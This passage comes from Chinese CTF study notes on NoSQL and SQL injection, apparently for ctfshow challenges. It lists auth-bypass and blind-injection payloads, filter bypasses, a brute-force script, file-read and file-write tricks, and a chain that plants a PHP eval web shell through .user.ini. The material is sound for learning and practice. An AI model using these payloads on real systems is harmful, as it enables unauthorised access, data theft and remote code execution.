  通过注入 '||1||'x，使 $where 的条件恒为真（||1 始终为真），从而返回所有数据。
  ```

| 攻击目标     | 常用Payload示例                                          | 攻击效果                               |
| :----------- | :------------------------------------------------------- | :------------------------------------- |
| **绕过认证** | `{"username": {"$ne": null}, "password": {"$ne": null}}` | 匹配所有非空用户，直接登录             |
| **提取数据** | `{"$where": "this.password.match(/^a/)"}`                | 在盲注中通过正则逐字符确认密码内容     |
| **布尔盲注** | `admin' && this.password.length < 9 || 'a'=='b`          | 通过返回结果的差异，判断条件真伪       |
| **时间盲注** | `{"$where": "sleep(5000)"}`                              | 若响应延迟，则证明存在注入             |
| **拒绝服务** | `' && function() { while(1) {} }` 或 `sleep(10000)`      | 制造死循环或长时间阻塞，耗尽服务器资源 |

```text
username[$ne]=1&password[$ne]=1
username[$ne]=admin&password[$ne]=1
#数组形式
username[$nin][]=admin&password[$nin][]=admin
#正则表达式
username[$regex]=^[^a]&password[$gt]=1
username 字段匹配：^[^a] → 用户名不以 'a' 开头
password 字段大于：'1' → 密码值大于 '1'
```



可以尝试使用布尔盲注



## 过滤场景（主要是联合注入）

### 过滤数字

```php
题目
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }

json_encode($ret)表示将结果以json格式输出
```

说明回显的结果不能有数字

#### replace()：将数字进行替换	用字母或者符号来替换数字

```php
-1' union select 'a', REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password, '0', 'A'), '1', 'B'), '2', 'C'), '3', 'D'), '4', 'E'), '5', 'F'), '6', 'G'), '7', 'H'), '8', 'I'), '9', 'J') from ctfshow_user4 where username='flag' --+
```

#### 自定义函数（伟大无需多言）

```php
def createNum(n):
    if n == 1:
        return 'true'
    else:
        # 返回 true+true+... 的形式，共 n 个
        return '+'.join(['true'] * n)
     
用这个来自定义数字，用true来表示数字
```

#### 无回显 -> 布尔盲注（页面不一样）

```text
1' and 1=1 --+	和	1' and 1=2 --+两者的页面不一样，可以用布尔盲注
```

```python
#python脚本来爆破内容（根据页面内容是否包含admin）
#这个脚本有问题，这里提供一个思路（由于回显中过滤了数据，所以看不到页面，不能用页面内容作为标志）
import requests

url = "http://your-target-url/api/v4.php"
flag = ""

for i in range(1, 50):
    for ascii_val in range(32, 127):
        # 构造Payload，逐位判断password字段的ASCII码
        payload = f"1' and ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1)) = {ascii_val} --+"
        r = requests.get(url + "?id=" + payload)
        # 根据页面是否包含 'admin' 或其他特征来判断
        if "admin" in r.text:
            flag += chr(ascii_val)
            print(flag)
            break
```

#### 将读取输出到其他文件（伟大无需多言）

```php
 1' union select username,password from ctfshow_user4 into outfile '/var/www/html/flag.txt' --+ 
```

### 过滤空格

#### 内敛注释

`/**/`： **内联注释**，替代空格

`/**/` 在 MySQL 中被视为注释，解析时忽略，因此可以当作空格使用

```php
-1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user%23
%23:#	此处是过滤了-- + 和 #
```

#### 换行符（ `%0a`）

```php
-1'%0aunion%0aselect%0a1,2,password%0afrom%0actfshow_user%23
```

#### 制表符（`%09`）

```php
-1'%09union%09select%091,2,password%09from%09ctfshow_user%23
```

#### 垂直制表符（`%0b`）

```php
-1'%0bunion%0bselect%0b1,2,password%0bfrom%0bctfshow_user%23
```

#### 括号

```php
-1'union(select(select(group_concat(password))from(ctfshow_user)),1,2)%23
```

#### 换页符（%0c）

```php
-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c
```

#### 回车符（%0d）

#### 不间断空格（%0a）

### 过滤注释

#### 可以用的注释

-- a(a前面有一个空格)或-- +（+前面有一个空格）和 #

#### 空格的替换（联系上面的过滤空格）

`--` 注释符的"启动器"可以是**任意非字母、非数字、非下划线、非空格的字符**。只要这个字符不是 `a-z`、`A-Z`、`0-9` 或 `_`，它就能让 `--` 生效。

`--%0c-` 利用了 `%0c`（换页符）作为空格

```php
-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c
和-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c-   都可以
```

```php
同样可以的是：
-1'or 1=1 --%01
-1'or 1=1 --%02
...
-1'or 1=1 --%19
-1'or 1=1 --%1a
-1'or 1=1 --%1b
-1'or 1=1 --%1f
```

### 万能的密码（or）

```php
-1'or 1=1 #
这后面的注释可以更改
```

```php
9999'or`username`='flag
这里的反引号是包裹列名或表名
```

### 过滤等号（=）

#### like

```php
-1'%0cor%0cusername%0clike%0c'flag
-1' or username like 'flag
```

### 过滤特定的char

#### 字符的拼接

```php
1'or(username=concat('fl','ag'))and'a'='a

```

#### 模糊查找

```php
'or(username)like'%la%
查找username中带有la字段元数据
```

#### 十六进制

```php
0'||username=0x666C6167--%01
0x666C6167是flag的十六进制
```

#### where被过滤

- 可以用having

- 可以用&&

  ```php
  select count(pass) from ctfshow_user && pass like 'ctfshow{c%';
  && 在这里会作为 where 条件的替代，因为 from 子句后面可以直接跟 where，但 where 被过滤了，而 && 在这里起到了逻辑连接的作用，使得查询等价于：
  select count(pass) from ctfshow_user where pass like 'ctfshow{c%';
  ```

#### like被过滤

可以用regexp（正则表达式）

```python
ctfshow_user group by pass having pass regexp({target_str}
```

## 一个思想

### 信息收集

这个思想在做一个特定题目的时候不能用，只有在做一步步加难度的题目可以用，因此限制很大，所以只是用来提供一种思路

在之前web177的题目获取的flag的用户名所在的id是26，可以在web180过滤了注释符时，可以选择不用注释符，用id=26(之前的题目得来的)

```php
-1'or(id=26)and'1
```

### 上传文件（load_file）

load_file():MySQL读取函数

```php
if(substr(load_file('/var/www/html/api/index.php'),{位置},1)regexp('{字符}'),1,0)
```

### Mysql的存储结构

```python
';prepare h from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute h;--+

SELECT * FROM information_schema.ROUTINES\
information_schema.ROUTINES 表存储了存储过程和函数的信息，可能包含自定义的敏感函数或保存的 flag
```

### 文件包含+File注入

```sql
filename=shell.txt' lines starting by '<?=eval($_GET[1])?>
filename=.user.ini' lines starting by 'auto_prepend_file=shell.txt\n
/dump/index.php?1=system('tac /flag.here');

那为什么要用.user.ini配置auto_prepend_file,直接访问shell.txt进行GET传参不行吗？
文件后缀决定了解析方式，直接访问 1.txt，服务器把它当成文本文件，不会执行 PHP 代码！
auto_prepend_file = 1.txt
意思是：在执行任何 .php 文件之前，先把 1.txt 的内容当作 PHP 代码包含进来执行。
```

```sql
filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a0a6175746f5f70726570656e645f66696c653d7368656c6c2e747874;#

LINES STARTING BY ';':每行开头加 ;（注释符，让前面的数据失效）
TERMINATED BY:每行结尾加指定字符
```



### 一些有意思的过滤绕过

#### 用反引号来包裹数据库和表名

```php
0;update`ctfshow_user`set`pass`=1
```

#### 修改题目意思

```text
题目
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

```sql
password=\&username=,username=database()#'
#利用反斜杠转义掉单引号，变成：
update ctfshow_user set pass = '\' where username = ',username=database()#'
```

#### or被禁

因为or被禁了，所以导致information_schema.tables也被禁了，我们可以用mysql.innodb_table_stats和mysql.innodb_index_stats获取数据表

```sql
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats)%23
```
